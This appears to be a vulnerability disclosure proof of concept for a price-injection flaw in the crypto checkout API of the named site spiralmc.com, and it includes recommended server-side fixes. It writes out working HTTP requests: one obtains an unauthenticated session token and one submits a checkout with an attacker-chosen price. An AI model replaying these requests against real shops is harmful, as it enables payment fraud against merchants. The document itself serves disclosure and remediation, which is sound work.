💸 spiralmc.com — Price Injection (F-149)

CRITICAL
⚠️ Authorized Use Only — This PoC documents a confirmed vulnerability discovered under written authorization. Do not reproduce against systems you do not own or have explicit written permission to test.

Vulnerability Summary

The POST /api/checkout/crypto endpoint on spiralmc.com accepts client-supplied price fields inside the items[] array for product types prefixed with acc_. The server passes this attacker-controlled price directly to the HoodPay payment API, creating a real, live payment order at the injected price rather than the legitimate server-side product price.

  • Root cause: Server trusts client-supplied price for acc_* item types; no server-side price lookup.
  • HoodPay minimum: $10.00 (attacker cannot go lower; $0 is rejected by payment processor).
  • Impact: Any visitor can purchase any account product for $10 regardless of true price.
  • Authentication required: None — guest checkout via customer object (see F-150).

Step 1 — Obtain Anonymous Session Token

The session endpoint issues a token per request with no authentication or rate limiting:

GET /api/session HTTP/1.1
Host: spiralmc.com

Response:
{"token":"<64-char-hex-session-token>"}

Step 2 — Send Crafted Checkout Request

Include a customer object (bypasses login) and inject your desired price in items[].price:

POST /api/checkout/crypto HTTP/1.1
Host: spiralmc.com
Content-Type: application/json
Authorization: Bearer <session-token>

{
  "customer": {
    "email": "attacker@example.com",
    "username": "attacker"
  },
  "items": [
    {
      "type": "acc_easyanticheat",
      "quantity": 1,
      "price": 10
    }
  ],
  "coupon_code": ""
}

Recommended Fix

  • Remove client-supplied price from the items[] array entirely.
  • Perform a server-side product price lookup by type ID in the database before passing to HoodPay.
  • Validate that the items[].price field, if accepted for any reason, matches the canonical DB price ± allowed discount.
  • Add authentication check: require a valid session (not just a guest token) to complete checkout.
